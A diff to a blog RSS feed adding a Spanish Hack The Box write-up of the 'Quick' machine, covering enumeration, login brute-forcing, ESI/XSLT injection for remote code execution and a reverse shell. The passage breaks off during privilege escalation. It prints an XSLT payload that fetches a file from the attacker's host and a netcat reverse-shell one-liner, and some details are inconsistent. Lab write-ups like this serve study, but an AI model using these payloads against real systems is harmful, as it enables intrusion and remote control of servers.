@@ -5,9 +5,768 @@
     <description>Articulos, Writeups, Htb, Programación y Noticias sobre Ciberseguridad</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 15 Jun 2023 00:01:13 +0000</pubDate>
-    <lastBuildDate>Thu, 15 Jun 2023 00:01:13 +0000</lastBuildDate>
+    <pubDate>Sat, 17 Jun 2023 02:02:46 +0000</pubDate>
+    <lastBuildDate>Sat, 17 Jun 2023 02:02:46 +0000</lastBuildDate>
     <generator>Jekyll v3.9.0</generator>
+    
+      <item>
+        <title>Maquina Quick - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo &lt;code&gt;Quick&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina potente &lt;code&gt;linux&lt;/code&gt; de dificultad hard, donde vamos a estar obtener informacion a traves del &lt;code&gt;http3&lt;/code&gt; compilando una version de &lt;code&gt;curl&lt;/code&gt;, con la información obtenida vamos a computar correos para mediante fuerza bruta ganar acceso a un pandel de tickets donde explotaremos una vulnerabilidad en &lt;code&gt;esigate&lt;/code&gt; que nos permitira realizar &lt;code&gt;RCE&lt;/code&gt; para ganar acceso al sistema. En la parte de elevación de privilegios nos aprovecharemos de la mala configuración de una impresora, para secuestrar el contenido que imprime y modificarlo para obtener información y migrar a otro usuario y ya como este podremos leer el contenido de un archivo de configuración que nos dara las credenciales del usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Es una maquina bastante entretenida asi que a darle!.&lt;/p&gt;
+
+&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Quick
+❯ ls
+ Quick
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.186
+PING 10.10.10.186 (10.10.10.186) 56(84) bytes of data.
+64 bytes from 10.10.10.186: icmp_seq=1 ttl=63 time=118 ms
+
+--- 10.10.10.186 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 117.913/117.913/117.913/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt;correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.186 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:46 GMT
+Initiating SYN Stealth Scan at 21:46
+Scanning 10.10.10.186 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.186
+Discovered open port 9001/tcp on 10.10.10.186
+Completed SYN Stealth Scan at 21:47, 17.10s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.186
+Host is up, received user-set (0.14s latency).
+Scanned at 2023-06-16 21:46:51 GMT for 17s
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+9001/tcp open  tor-orport syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds
+           Raw packets sent: 83322 (3.666MB) | Rcvd: 83310 (3.332MB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,9001 10.10.10.186 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:48 GMT
+Nmap scan report for 10.10.10.186
+Host is up (0.20s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
+|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
+|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
+9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Quick | Broadband Services
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.12 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;21&lt;/td&gt;
+      &lt;td&gt;SSH&lt;/td&gt;
+      &lt;td&gt;OpenSSH 7.6p1&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;9001&lt;/td&gt;
+      &lt;td&gt;HTTP&lt;/td&gt;
+      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Utilizaremos &lt;code&gt;whatweb&lt;/code&gt; para identificar las tecnoligias que emplea el servicio web de la maquina en el puerto &lt;code&gt;9001&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.186:9001
+http://10.10.10.186:9001 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.186], Script, Title[Quick | Broadband Services], Via-Proxy[1.1 localhost (Apache-HttpClient/4.5.2 (cache))], X-Powered-By[Esigate]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que el servicio corresponde a un &lt;code&gt;Esigate&lt;/code&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Esigate: ESIGate permite una integración transparente y eficiente entre todas las aplicaciones Web. Por ejemplo, agregue a un CMS (Sistema de gestión de contenidos) módulos desarrollados en cualquier lenguaje (PHP, Java, . Net…) sin problemas de caché o de accesibilidad.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Abrimos el servicio en el navegador y vemos un mensaje &lt;code&gt;update&lt;/code&gt;, donde nos comenta que se esta utilizando la ultima versión de &lt;code&gt;http&lt;/code&gt;, que corresponde a &lt;code&gt;http3&lt;/code&gt;, ademas tambien podemos ver una lista de usuarios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si vamos al enlace de &lt;code&gt;clientes&lt;/code&gt;, obtenemos mas información de los usuarios como la empresa y pais a la cual pertenecen.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Volviendo a la pagina principal, haciendo hovering en &lt;code&gt;portal&lt;/code&gt; obtenemos que se nos redirige a otro subdominio, el cual añadiremos a nuestro &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo &quot;10.10.10.186 quick.htb portal.quick.htb&quot; &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que no podemos visualizar la pagina, aun agregando los subdominios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Investigando un poco del &lt;code&gt;http3&lt;/code&gt;, vemos que la nueva versión de &lt;code&gt;http3&lt;/code&gt; sera la que deje de usar el protocolo &lt;code&gt;TCP&lt;/code&gt; y lo reemplazara por uno nuevo de nombre &lt;code&gt;Quick&lt;/code&gt;. Curiosamente similar al nombre de la maquina.&lt;/p&gt;
+
+&lt;p&gt;Puedes ver mas detalles en el siguiente articulo.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido&quot;&gt;https://www.xataka.com/basics/http-3-que-donde-viene-que-que-cambia-para-buscar-internet-rapido&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para poder usar esta versión experimental, vamos a recompilar una versión de &lt;code&gt;curl&lt;/code&gt;, del siguiente repositorio:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&quot;&gt;https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para efectos practicos ejecutando los siguientes comandos podremos obtener el binario funcional.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez lo tengamos correctamente instalado, ejecutamos y esta vez si podemos ver la pagina, la cual nos expone algunas rutas.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+❯ ./src/.libs/curl -s --http3 &quot;https://portal.quick.htb/&quot; -k
+&amp;lt;html&amp;gt;
+  &amp;lt;ul&amp;gt;
+    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php&quot;&amp;gt;Home&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=contact&quot;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=about&quot;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+    &amp;lt;li&amp;gt;&amp;lt;a href=&quot;index.php?view=docs&quot;&amp;gt;References&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+  &amp;lt;/ul&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Encontramos nuevos usuarios en la ruta &lt;code&gt;about&lt;/code&gt; y usamos &lt;code&gt;html2text&lt;/code&gt; para moestrarlo estetico en consola.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ./src/.libs/curl -s --http3 &quot;https://portal.quick.htb/?view=about&quot; -k | html2text
+****** Quick | About Us ******
+***** Our Team *****
+[Jane]
+***** Jane Doe *****
+CEO &amp;amp; Founder
+Quick Broadband services established in 2012 by Jane.
+jane@quick.htb
+[Mike]
+***** Mike Ross *****
+Sales Manager
+Manages the sales and services.
+mike@quick.htb
+[John]
+***** John Doe *****
+Web Designer
+Front end developer.
+john@quick.htb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Encontramos un &lt;code&gt;pdf&lt;/code&gt;, donde podemos obtener una contraseña &lt;code&gt;Quick4cc3$$&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./src/.libs/curl --http3 &quot;https://portal.quick.htb/docs/QuickStart.pdf&quot; -k --output QuickStart.pdf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos dirigimos al panel principal y vamos al enlace &lt;code&gt;Get Started&lt;/code&gt;, que nos redirige a un panel de logeo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Contamos con una contraseña, pero recordemos que anteriormente obtuvimos una lista de usuarios. Como el panel de logeo nos pide un email valido, vamos a crearnos un diccionario con los usuarios que obtuvimos, y ya que tambien se nos filtro la compañia y pais de origen de cada uno, podemos computar posibles correos a partir de estos datos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat users.txt
+tim@qconsulting.co.uk
+tim@qconsulting.co
+tim@qconsulting.uk
+tim@qconsulting.com
+tim@quick.htb
+roy@darkwng.us
+roy@quick.htb
+roy@darkwng.com
+elisa@wink.uk
+elisa@wink.co.uk
+elisa@quick.htb
+elisa@wink.com
+james@lazycoop.cn
+james@lazycoop.com
+james@quick.htb
+mike@quick.htb
+jane@quick.htb
+jhon@quick.htb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora mediante fuerza bruta trataremos de encontrar una credencial valida, para ello usaremos &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 50 -w $(pwd)/users.txt -d 'email=FUZZ&amp;amp;password=Quick4cc3$$' &quot;http://10.10.10.186:9001/login.php&quot;
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.186:9001/login.php
+Total requests: 18
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000000003:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.uk&quot;                                                                                                  
+000000007:   200        0 L      2 W        80 Ch       &quot;roy@quick.htb&quot;                                                                                                       
+000000015:   200        0 L      2 W        80 Ch       &quot;james@quick.htb&quot;                                                                                                     
+000000014:   200        0 L      2 W        80 Ch       &quot;james@lazycoop.com&quot;                                                                                                  
+000000001:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.co.uk&quot;                                                                                               
+000000012:   200        0 L      2 W        80 Ch       &quot;elisa@wink.com&quot;                                                                                                      
+000000016:   200        0 L      2 W        80 Ch       &quot;mike@quick.htb&quot;                                                                                                      
+000000013:   200        0 L      2 W        80 Ch       &quot;james@lazycoop.cn&quot;                                                                                                   
+000000018:   200        0 L      2 W        80 Ch       &quot;jhon@quick.htb&quot;                                                                                                      
+000000017:   200        0 L      2 W        80 Ch       &quot;jane@quick.htb&quot;                                                                                                      
+000000006:   200        0 L      2 W        80 Ch       &quot;roy@darkwng.us&quot;                                                                                                      
+000000010:   302        0 L      0 W        0 Ch        &quot;elisa@wink.co.uk&quot;                                                                                                    
+000000011:   200        0 L      2 W        80 Ch       &quot;elisa@quick.htb&quot;                                                                                                     
+000000009:   200        0 L      2 W        80 Ch       &quot;elisa@wink.uk&quot;                                                                                                       
+000000002:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.co&quot;                                                                                                  
+000000005:   200        0 L      2 W        80 Ch       &quot;tim@quick.htb&quot;                                                                                                       
+000000008:   200        0 L      2 W        80 Ch       &quot;roy@darkwng.com&quot;                                                                                                     
+000000004:   200        0 L      2 W        80 Ch       &quot;tim@qconsulting.com&quot;                                                                                                 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que uno nos reporta un codigo de estado &lt;code&gt;302&lt;/code&gt;, validamos las credenciales y ganamos acceso a un panel de generación de &lt;code&gt;tickets&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Anteriormente vimos que el servicio web, usaba &lt;code&gt;esigate&lt;/code&gt; y buscando vulnerabilidades asociadas encontramos que podemos hace una inyección para obtener &lt;code&gt;RCE a traves de XSLT&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Dejo el siguiente articulo si quieres saber a detalle en que consiste la vulnerabilidad y su explotación paso a paso.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&quot;&gt;https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para explotar vamos a crear dos archivo con extension &lt;code&gt;xml y xsl&lt;/code&gt;, con el mismo contenido, donde en la opción &lt;code&gt;CDATA&lt;/code&gt; inyectaremos el codigo que queremos ejecutar.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
+&amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&amp;gt;
+&amp;lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&amp;gt;
+&amp;lt;xsl:template match=&quot;/&quot;
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&amp;gt;
+&amp;lt;root&amp;gt;
+&amp;lt;xsl:variable name=&quot;cmd&quot;&amp;gt;&amp;lt;![CDATA[wget http://10.10.16.4/shell]]&amp;gt;&amp;lt;/xsl:variable&amp;gt;
+&amp;lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&amp;gt;
+&amp;lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&amp;gt;
+Process: &amp;lt;xsl:value-of select=&quot;$process&quot;/&amp;gt;
+Command: &amp;lt;xsl:value-of select=&quot;$cmd&quot;/&amp;gt;
+&amp;lt;/root&amp;gt;
+&amp;lt;/xsl:template&amp;gt;
+&amp;lt;/xsl:stylesheet&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Asi mismo como vamos a hacer una petición a un archivo de nuestra maquina de nombre &lt;code&gt;shell&lt;/code&gt;, vamos a introducir dentro de este un codigo en bash que nos permita obtener una rever shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat shell
+#!/bin/bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo siguiente sera ejecutar el siguiente codigo en la opción de &lt;code&gt;raise ticket&lt;/code&gt;, donde realizaremos una petición a los archivos previamente creados.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;esi:include src=&quot;http://10.10.16.4/a.xml&quot; stylesheet=&quot;http://10.10.16.4/a.xsl&quot;&amp;gt;
+&amp;lt;/esi:include&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Se nos generara un codigo de ticket.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Buscamos el ticket en la ruta &lt;code&gt;search.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y en consecuencia recibimos la petición, que indica que se subio nuestro archivo &lt;code&gt;shell&lt;/code&gt; a la maquina victima.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.186 - - [16/Jun/2023 23:40:17] &quot;GET /a.xsl HTTP/1.1&quot; 200 -
+10.10.10.186 - - [16/Jun/2023 23:40:17] &quot;GET /a.xml HTTP/1.1&quot; 200 -
+10.10.10.186 - - [16/Jun/2023 23:40:18] &quot;GET /shell HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora debemos hacer el mismo proceso, pero esta vez modificaremos nuestros archivos con el comando inyectado en &lt;code&gt;CDATA&lt;/code&gt; por &lt;code&gt;bash shell&lt;/code&gt;, para que se ejecute nuestro archivo.&lt;/p&gt;
+
+&lt;p&gt;Para evitar problemas en esta segunda petición modifiquemos el nombre de los archivos &lt;code&gt;xml y xsl&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; ?&amp;gt;
+&amp;lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&amp;gt;
+&amp;lt;xsl:output method=&quot;xml&quot; omit-xml-declaration=&quot;yes&quot;/&amp;gt;
+&amp;lt;xsl:template match=&quot;/&quot;
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+xmlns:rt=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;&amp;gt;
+&amp;lt;root&amp;gt;
+  &amp;lt;xsl:variable name=&quot;cmd&quot;&amp;gt;&amp;lt;![CDATA[bash shell]]&amp;gt;&amp;lt;/xsl:variable&amp;gt;
+&amp;lt;xsl:variable name=&quot;rtObj&quot; select=&quot;rt:getRuntime()&quot;/&amp;gt;
+&amp;lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtObj, $cmd)&quot;/&amp;gt;
+Process: &amp;lt;xsl:value-of select=&quot;$process&quot;/&amp;gt;
+Command: &amp;lt;xsl:value-of select=&quot;$cmd&quot;/&amp;gt;
+&amp;lt;/root&amp;gt;
+&amp;lt;/xsl:template&amp;gt;
+&amp;lt;/xsl:stylesheet&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Realizamos la misma ejecución.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos genera otro nuevo ticket que al buscarlo nuevamente en la ruta &lt;code&gt;search.php&lt;/code&gt;, ejecuta el archivo dandonos acceso al sistema como el usuario &lt;code&gt;sam&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.186 - - [17/Jun/2023 00:04:41] &quot;GET /c.xsl HTTP/1.1&quot; 200 -
+10.10.10.186 - - [17/Jun/2023 00:04:42] &quot;GET /c.xml HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.186.
+Ncat: Connection from 10.10.10.186:38672.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+sam
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como es de costumbre, ahora ganaremos acceso con una &lt;code&gt;tty full interactive&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
+Script started, file is /dev/null
+sam@quick:~$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+sam@quick:~$ export TERM=xterm
+sam@quick:~$ export SHELL=bash
+sam@quick:~$ stty rows 45 columns 184
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;sam&lt;/code&gt; y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:~$ ls
+esigate-distribution-5.2  shell  user.txt
+sam@quick:~$ cat user.txt 
+359179c57000cd4aa582740c4a637cc6
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ya que el servicio corre en un &lt;code&gt;apache&lt;/code&gt;, visualizamos el archivo de configuración y encontramos un nuevo subdominio &lt;code&gt;printerv2.quick.htb&lt;/code&gt;, correspondiente a otro panel de logeo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sam@quick:~$ 2cat /etc/apache2/sites-enabled/000-default.conf 
+&amp;lt;VirtualHost *:80&amp;gt;
+	# The ServerName directive sets the request scheme, hostname and port that
+	# the server uses to identify itself. This is used when creating
+	# redirection URLs. In the context of virtual hosts, the ServerName
+	# specifies what hostname must appear in the request's Host: header to
+	# match this virtual host. For the default virtual host (this file) this
+	# value is not decisive as it is used as a last resort host regardless.
+	# However, you must set it for any further virtual host explicitly.
+	#ServerName www.example.com
+
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+
+	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
+	# error, crit, alert, emerg.
